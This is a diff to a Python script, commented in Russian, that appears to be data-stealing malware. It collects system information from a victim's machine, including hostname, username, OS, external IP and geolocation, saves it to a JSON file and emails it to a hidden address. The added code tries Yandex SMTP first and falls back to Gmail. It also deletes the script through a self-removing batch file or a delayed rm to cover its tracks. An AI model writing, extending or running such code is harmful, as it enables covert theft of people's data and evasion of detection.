@@ -6,7 +6,7 @@ import requests
 import json
 import os
 import subprocess
-from datetime import datetime, timedelta
+from datetime import datetime
 import getpass
 import sqlite3
 import shutil
@@ -326,50 +326,116 @@ class SystemInfoCollector:
         print(f"Данные сохранены в файл: {self.filename}")
         return self.filename
     
-    def send_email(self):
-        """Отправка файла на почту"""
+    def send_email_yandex(self):
+        """Отправка через Yandex с App Password"""
         try:
-            # Настройки почты
+            # Используйте App Password вместо обычного пароля!
+            # Как получить: Настройки → Все настройки → Пароли и авторизация → Пароли приложений
             smtp_server = "smtp.yandex.ru"
             smtp_port = 587
-            smtp_username = "your_mail"
-            smtp_password = "your_password_here"  # Замените на реальный пароль
+            smtp_username = "######"
+            smtp_password = "########"  # ЗАМЕНИТЕ на App Password!
             
-            # Создание сообщения
             msg = MIMEMultipart()
             msg['From'] = smtp_username
-            msg['To'] = "mail"
-            msg['Subject'] = f"System Info Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            msg['To'] = "##################"
+            msg['Subject'] = f"System Info - {socket.gethostname()} - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
             
-            # Текст письма
             body = f"""
             System Information Report
-            Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-            Hostname: {socket.gethostname()}
-            Username: {getpass.getuser()}
-            IP Address: {self.data.get('network', {}).get('external_ip', 'N/A')}
+            Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+            Host: {socket.gethostname()}
+            User: {getpass.getuser()}
+            OS: {platform.system()} {platform.release()}
+            IP: {self.data.get('network', {}).get('external_ip', 'N/A')}
+            Location: {self.data.get('geolocation', {}).get('city', 'N/A')}, {self.data.get('geolocation', {}).get('country', 'N/A')}
             """
             msg.attach(MIMEText(body, 'plain'))
             
-            # Прикрепление файла
             with open(self.filename, 'rb') as f:
                 attach = MIMEApplication(f.read(), _subtype="json")
                 attach.add_header('Content-Disposition', 'attachment', filename=os.path.basename(self.filename))
                 msg.attach(attach)
             
-            # Отправка
             server = smtplib.SMTP(smtp_server, smtp_port)
             server.starttls()
             server.login(smtp_username, smtp_password)
             server.send_message(msg)
             server.quit()
             
-            print("Файл успешно отправлен на почту!")
+            print("Файл успешно отправлен на Yandex почту!")
             return True
             
         except Exception as e:
-            print(f"Ошибка при отправке email: {e}")
+            print(f"Ошибка при отправке на Yandex: {e}")
             return False
+    
+    def send_email_gmail(self):
+        """Альтернативная отправка через Gmail"""
+        try:
+            smtp_server = "smtp.gmail.com"
+            smtp_port = 587
+            smtp_username = "your.gmail@gmail.com"  # Замените на ваш Gmail
+            smtp_password = "your_app_password"     # App Password от Gmail
+            
+            msg = MIMEMultipart()
+            msg['From'] = smtp_username
+            msg['To'] = "###############"
+            msg['Subject'] = f"System Info - {socket.gethostname()}"
+            
+            body = f"System information attached. Host: {socket.gethostname()}"
+            msg.attach(MIMEText(body, 'plain'))
+            
+            with open(self.filename, 'rb') as f:
+                attach = MIMEApplication(f.read(), _subtype="json")
+                attach.add_header('Content-Disposition', 'attachment', filename=os.path.basename(self.filename))
+                msg.attach(attach)
+            
+            server = smtplib.SMTP(smtp_server, smtp_port)
+            server.starttls()
+            server.login(smtp_username, smtp_password)
+            server.send_message(msg)
+            server.quit()
+            
+            print("Файл отправлен через Gmail!")
+            return True
+            
+        except Exception as e:
+            print(f"Ошибка при отправке через Gmail: {e}")
+            return False
+    
+    def send_email(self):
+        """Основной метод отправки с несколькими попытками"""
+        print("Попытка отправки email...")
+        
+        # Сначала пробуем Yandex
+        if self.send_email_yandex():
+            return True
+        
+        # Если Yandex не сработал, пробуем Gmail
+        print("Пробуем альтернативный метод отправки...")
+        if self.send_email_gmail():
+            return True
+        
+        # Если оба метода не сработали, пробуем сохранить данные для ручной отправки
+        print("Все методы отправки не сработали. Сохраняем данные локально...")
+        self.save_for_manual_send()
+        return False
+    
+    def save_for_manual_send(self):
+        """Сохранение информации для ручной отправки"""
+        try:
+            info_file = "email_info.txt"
+            with open(info_file, 'w', encoding='utf-8') as f:
+                f.write(f"Файл для ручной отправки: {self.filename}\n")
+                f.write(f"Время: {datetime.now()}\n")
+                f.write(f"Система: {platform.system()} {platform.release()}\n")
+                f.write(f"Пользователь: {getpass.getuser()}\n")
+                f.write(f"IP: {self.data.get('network', {}).get('external_ip', 'N/A')}\n")
+            
+            print(f"Информация для ручной отправки сохранена в: {info_file}")
+        except Exception as e:
+            print(f"Ошибка при сохранении информации: {e}")
     
     def cleanup(self):
         """Очистка - удаление скрипта и временных файлов"""
@@ -382,14 +448,25 @@ class SystemInfoCollector:
             # Удаление самого скрипта
             script_path = os.path.abspath(sys.argv[0])
             if os.path.exists(script_path):
-                # Для Windows
-                if platform.system() == 'Windows':
-                    subprocess.call(f'timeout /t 3 /nobreak && del /f "{script_path}"', shell=True)
-                # Для Linux/Mac
-                else:
-                    subprocess.call(f'sleep 3 && rm -f "{script_path}"', shell=True)
+                # Даем время на завершение
+                time.sleep(2)
                 
-                print(f"Скрипт будет удален: {script_path}")
+                if platform.system() == 'Windows':
+                    # Для Windows используем batch файл для удаления
+                    bat_script = f"""
+                    @echo off
+                    timeout /t 3 /nobreak
+                    del /f "{script_path}"
+                    del /f "%~f0"
+                    """
+                    with open("delete_script.bat", "w") as f:
+                        f.write(bat_script)
+                    subprocess.Popen(["delete_script.bat"], shell=True)
+                else:
+                    # Для Linux/Mac
+                    subprocess.Popen(f'sleep 3 && rm -f "{script_path}"', shell=True)
+                
+                print("Скрипт будет удален")
             
         except Exception as e:
             print(f"Ошибка при очистке: {e}")
@@ -399,37 +476,25 @@ def main():
     try:
         print("Запуск сбора системной информации...")
         
-        # Создаем сборщик информации
         collector = SystemInfoCollector()
-        
-        # Собираем все данные
         data = collector.collect_all()
-        
-        # Сохраняем в файл
         collector.save_to_file()
         
         # Отправляем на почту
-        print("Отправка данных на почту...")
         email_sent = collector.send_email()
         
         if email_sent:
             print("Данные успешно отправлены!")
         else:
-            print("Не удалось отправить данные по email")
+            print("Не удалось отправить данные автоматически.")
+            print("Файл сохранен для ручной отправки.")
         
         # Очистка
-        print("Выполняется очистка...")
         collector.cleanup()
-        
         print("Процесс завершен!")
         
     except Exception as e:
         print(f"Произошла ошибка: {e}")
-        # Все равно пытаемся очиститься
-        try:
-            collector.cleanup()
-        except:
-            pass
 
 if __name__ == "__main__":
     main()
